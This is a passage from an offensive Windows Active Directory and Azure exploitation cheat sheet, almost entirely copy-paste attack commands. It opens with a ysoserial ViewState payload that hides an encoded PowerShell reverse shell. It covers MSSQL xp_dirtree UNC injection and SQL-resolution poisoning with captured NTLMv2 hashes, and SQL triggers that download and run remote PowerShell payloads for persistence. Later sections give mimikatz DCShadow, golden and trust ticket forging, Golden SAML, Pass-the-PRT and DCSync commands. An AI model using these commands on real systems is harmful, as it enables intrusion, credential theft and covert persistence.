ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -exec bypass -enc JHNtPShOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuMTAuMTQuOSIsOTAwNikpLkdldFN0cmVhbSgpO1tieXRlW11dJGJ0PTAuLjY1NTM1fCV7MH07d2hpbGUoKCRpPSRzbS5SZWFkKCRidCwwLCRidC5MZW5ndGgpKSAtbmUgMCl7OyRkPShOZXctT2JqZWN0IFRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRidCwwLCRpKTskc3Q9KFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKChpZXggJGQgMj4mMSkpOyRzbS5Xcml0ZSgkc3QsMCwkc3QuTGVuZ3RoKX0=" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="05ae4b41-51e1-4c3a-9241-6b87b169d663" --isdebug –islegacy
```

### MSSQL Server

#### UNC Path Injection

\[ ❓ ] : Uniform Naming Convention **allows the sharing of resources** on a network via a very precise syntax: `\IP-Server\shareName\Folder\File`

launch responder : `responder -I eth0`

```
EXEC master..xp_dirtree \"\\\\192.168.1.33\\\\evil\";
```

```
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--
```

#### MC-SQLR Poisoning

_The SQL Server Resolution Protocol is a simple application-level protocol that is used for the transfer of requests and responses between clients and database server discovery services._

```
CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXIST\INSTANCE;Integrated Security=SSPI;"
```

> we captured the hash of the **Administrator** with this VBA script.

```
[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
[MSSQL-BROWSER] Sending poisoned browser response to 10.10.14.33
[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
[MSSQL] NTLMv2 Client   : 10.1.2.3
[MSSQL] NTLMv2 Username : TEST\Administrator
[MSSQL] NTLMv2 Hash     : Administrator::TEST:1122334455667788...
```

#### DML, DDL and Logon Triggers

\[ ❓ ] : **Triggers** are a stored procedure that automatically executes when an event occurs in the SQL Server.

* Data Definition Language (DDL) – Executes on Create, Alter and Drop statements and some system stored procedures.
* Data Manipulation Language (DML) – Executes on Insert, Update and Delete statements.
* Logon Triggers – Executes on a user logon.

**Triggers Listing**

_list All triggers_

```
SELECT * FROM sys.server_triggers
```

_list triggers for a database_

```
SELECT * FROM sys.server_triggers
```

_list DDL and DML triggers on an instance using powershell_

```
Get-SQLTriggerDdl -Instance ops-sqlsrvone -username $username -Password $password -Verbose
Get-SQLTriggerDml -Instance ops-sqlsrvone -username $username -Password $password -Verbose
```

_use DML triggers for persistence_

```
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
USE testdb
CREATE TRIGGER [persistence_dml_1]
ON testdb.dbo.datatable
FOR INSERT, UPDATE, DELETE AS
EXECUTE AS LOGIN = 'as'
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString('http://$ip_attacker/payload.ps1')"'
GO
```

_use DDL triggers for persistence_

```
CREATE Trigger [persistence_ddl_1]
ON ALL Server
FOR DDL_LOGIN_EVENTS
AS
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString('http://$ip_attacker/payload.ps1')"
GO
```

_use Logon triggers for persistence_

```
CREATE Trigger [persistence_logon_1]
ON ALL SERVER WITH EXECUTE AS 'sa'
FOR LOGON
AS
BEGIN
IF ORIGINAL_LOGIN() = 'testuser'
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString('http://$ip_attacker/payload.ps1')"
END;
```

### Forest Persistence

#### DCShadow

**DCShadow temporarily registers a new domain controller in the target domain** and uses it to "push" attributes like SIDHistory, SPNs... on specified objects without leaving the change logs for modified object!

_⚠️ Requirements :_

* DA privileges are required to use DCShadow.
* The attacker's machine must be part of the root domain.

The attack needs 2 instances on a compromised machine :

**1 instance :** _start RPC servers with SYSTEM privileges and specify attributes to be modified_

```
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:root1user /attribute:Description /value="Hello from DCShadow"
```

**2 instance :** _with enough privileges of DA to push the values :_

```
mimikatz # sekurlsa::pth /user:Administrator /domain:$domain /ntlm:$admin_hash /impersonate
mimikatz # lsadump::dcshadow /push
```

### Cross Forest Attacks

#### Trust Tickets

_Dumping Trust Key_

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

_Forging IR-TGT using Trust key_

```
Invoke-Mimikatz -Command '"Kerberos::golden /domain:$domain /sid:$sid /sids:$extra_sids /rc4:$rc4_hash /user:Administrator /service:krbtgt /target:$target /ticket:$path/to/trust_ticket.kirbi"'
```

_get TGS for CIFS service_

```
asktgs path/to/trust_ticket.kirbi CIFS/ps-dc.powershell.local
```

_use TGS for CIFS service_

```
kirbikator.exe lsa .\CIFS.$domain.kirbi ls \\$domain\`c$
```

#### Using KRBTGT hash

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domaine.fun.local /sid:S-1-5-x-x-x-x /sids:S-1-5-x-x-x-x-519 /krbtgt:<hash> /ticket:C:\path\krb_tgt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krb_tgt.kirbi
```

### Azure Active Directory

#### AZ User Enumeration

_connection to Azure Active Directory with **Connect-MsolService**._

```
PS> Connect-MsolService -Credential $cred
```

_this command allow enumeration with MFA (MultiFactor Authentification)_

```
Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { "Disabled"}}} | export-csv mfaresults.csv
```

_locate Azure AD Connect Server_

```
ldapsearch -H ldap://DC01.MEGACORP.CORP:389 -D "MEGACORP\john" -w $password -b "DC=MEGACORP,DC=CORP" '(description=*Azure*)' description
```

#### Enumeration using AZ CLI

**Storage Enumeration**

_blob storage enumeration_

```
az storage account list -o table
az storage account list -o json | jq -r '.[].name'
```

#### PowerZure

_create a new user_

```
New-AzureUser -Username 'john.doe@megacorp.com' -Password catAker
```

_Executes a command on a specified VM_

```
Execute-Command -OS Windows -VM Win10 -ResourceGroup rg01 -Command "whoami"
```

#### Golden SAML

_⚠️ Requirements :_

* Admin privileges of ADFS server
* `ADFS Public Certificate`
* `IdP Name`
* `Role Name`

> Obtain `ADFS Public Certificate`:

```
PS > [System.Convert]::ToBase64String($cer.rawdata)
```

> Obtain `IdP Name`:

```
PS > (Get-ADFSProperties).Identifier.AbsoluteUri
```

> Obtain `Role Name`:

```
PS > (Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```

a toolkit to exploit Golden SAML can be found [here](https://github.com/secureworks/whiskeysamlandfriends)

> \*\* Golden SAML is similar to golden ticket and affects the Kerberos protocol. Like the Golden Ticket, the Golden SAML allows an attacker to access resources protected by SAML agents (examples: Azure, AWS, vSphere, Okta, Salesforce, ...) with elevated privileges through a golden ticket.\*\*

_ShockNAwe:_

*
  1. Remotely extracts the AD FS configuration settings
*
  1. Forges and signs a Golden SAML token
*
  1. Extracts the ‘assertion’ portion of the Golden SAML token and passes it to the Azure Core Management API to obtain a valid access token for the API
*
  1. Enumerates the Subscription ID
*
  1. Enumerates the complete list of VMs in the subscription
*
  1. Executes arbitrary commands on all VMs as SYSTEM/root

_WhiskeySAML:_

*
  1. Remotely extract AD FS configuration settings
*
  1. Forge and sign Golden SAML tokens
*
  1. Pass the Golden SAML token to the Microsoft Azure portal
*
  1. Log into the Azure portal as any user while bypassing Azure MFA configurations

```
python3 shocknawe.py --target-user $user --domain $domain --adfs-host=$adfs_server --dc-ip $ip
```

#### PRT Manipulation

**PassThePRT**

_check AzureAdJoined Status and download Mimikatz:_

```
dsregcmd.exe /status
iex (New-Object Net.Webclient).downloadstring(“https://server/Invoke-Mimikatz.ps1”)
```

_Looking for **prt** and **KeyValue**:_

```
mimikatz # privilege::debug
mimikatz # sekurlsa::cloudap
```

_use **APKD function** to decode **KeyValue** and save **"Context"** and **"DerivedKey"** value:_

```
mimikatz # token::elevate
mimikatz # dpapi::cloudapkd /keyvalue:$KeyValue /unprotect
```

```
mimikatz # dpapi::cloudapkd /context:$context /derivedkey:$DerivedKey /Prt:$prt

---SNIP---
Signed JWT : eyJ...
```

_Forge PRT-Cookie using_ [_lantern_](https://github.com/ConstantinT/Lantern)_:_

```
Lantern.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
Lantern.exe cookie --sessionkey <SessionKey> --prt <PRT from Mimikatz>
```

_Generate JWT_

```
PS AADInternals> $PRT_OF_USER = '...'
PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
PS AADInternals> $ClearKey = "XXYYZZ..."
PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
```

#### MSOL Service Account

> you can dump MSOL Service account with [azuread\_decrypt\_msol.ps1](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c) used by Azure AD Connect Sync and launch a DCsync attack with the dumped creds

_DCSync with MSOL account_

```
secretsdump -outputfile hashes $domain/$msol_svc_acc:$msol_pwd@$ip
```

### Miscs

#### Domain Level Attribute

**MachineAccountQuota (MAQ) Exploitation**

use crackmapexec (CME) with maq module :

`cme ldap $dc -d $DOMAIN -u $USER -p $PASSWORD -M maq`

**BadPwdCount**

```
crackmapexec ldap 10.10.13.100 -u $user -p $pwd --kdcHost 10.10.13.100 --users
LDAP        10.10.13.100       389    dc1       Guest      badpwdcount: 0 pwdLastSet: <never>
```

#### Abusing IPv6 in AD

sending ICMPv6 packet to the target using ping6 :

`ping6 -c 3 <target>`

scanning IPv6 address using nmap :

`nmap -6 -sCV dead:beef:0000:0000:b885:d62a:d679:573f --max-retries=2 --min-rate=3000 -Pn -T3`

tips for adapting tools for ipv6 :

```
echo -n "port1" "port2" "port3" | xargs -d ' ' -I% bash -c 'socat TCP4-LISTEN:%,fork TCP6:[{ipv6-address-here}]:% &'
netstat -laputen |grep LISTEN
```

you can replace AF\_INET value to AF\_INET6 from socket python lib :

```
sed -i "s/AF_INET/AF_INET6/g" script.py
```

**Rogue DHCP**

`mitm6 -i eth0 -d 'domain.job.local'`

**IOXIDResolver Interface Enumeration**

it's a little script that enumerate addresses in NetworkAddr field with [**RPC\_C\_AUTHN\_DCE\_PUBLIC**](https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-service-constants) level

```
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter

RPC_C_AUTHN_DCE_PUBLIC  = 2

stringBinding = r'ncacn_ip_tcp:%s' % "IP"
rpctransport = transport.DCERPCTransportFactory(stringBinding)
rpc = rpctransport.get_dce_rpc()
rpc.set_auth_level(RPC_C_AUTHN_DCE_PUBLIC)
rpc.connect()
print("[*] Try with RPC_C_AUTHN_DCE_PUBLIC...")
exporter = IObjectExporter(rpc)
binding = exporter.ServerAlive2()
for bind in binding:
    adr = bind['aNetworkAddr']
    print("Adresse:", adr)
```

### References

* [https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/cloudap](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/cloudap)
* [https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/](https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/)
* [https://www.thehacker.recipes/ad/movement/kerberos/asreproast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
* [https://www.hackingarticles.in/credential-dumping-ntds-dit/](https://www.hackingarticles.in/credential-dumping-ntds-dit/)
* [https://blog.alsid.eu/dcshadow-explained-4510f52fc19d](https://blog.alsid.eu/dcshadow-explained-4510f52fc19d)
* [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
* [https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
* [https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)
* [https://github.com/rootsecdev/Azure-Red-Team](https://github.com/rootsecdev/Azure-Red-Team)
* [https://www.secureworks.com/blog/going-for-the-gold-penetration-testing-tools-exploit-golden-saml](https://www.secureworks.com/blog/going-for-the-gold-penetration-testing-tools-exploit-golden-saml)
